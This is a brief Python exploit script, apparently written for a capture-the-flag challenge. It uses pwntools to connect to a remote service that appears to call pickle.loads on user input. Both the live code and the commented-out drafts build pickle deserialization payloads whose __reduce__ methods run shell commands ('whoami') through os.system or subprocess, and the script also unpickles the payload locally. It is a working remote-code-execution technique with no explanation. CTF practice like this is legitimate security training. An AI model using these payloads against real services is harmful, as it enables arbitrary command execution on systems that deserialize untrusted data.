#!/usr/local/bin/python
# import pickle
# pickle.loads(input("pickle: ").split()[0].encode())

from pwn import *
import os
import pickle


re = remote('mc.ax', 31773)


# import base64
# import codecs
# import pickle
# class RCE(object):
#     def __reduce__(self):
#         import subprocess
#         return (subprocess.check_output, (['whoami'], ) )
# class RCEStr(object):
#     def __reduce__(self):
#         return (codecs.decode, (RCE(), 'utf-8') )
    
# class test():
#     def __reduce__(self):
#         command=r"whoami"
#         return (os.system,(command,))
        
# pickle_data = pickle.dumps({'name': RCEStr()})
# payload = base64.urlsafe_b64encode(pickle_data).decode()
# print(payload)

# pickle.loads(payload.split()[0].encode())

# re.sendline(payload)

import os
import pickle
import pickletools
class A:
    def __reduce__(self):
        return os.system, ('whoami',)
pickled = (pickle.dumps({'name': A()}))
print(pickled)
pickle.loads(pickled)

re.interactive()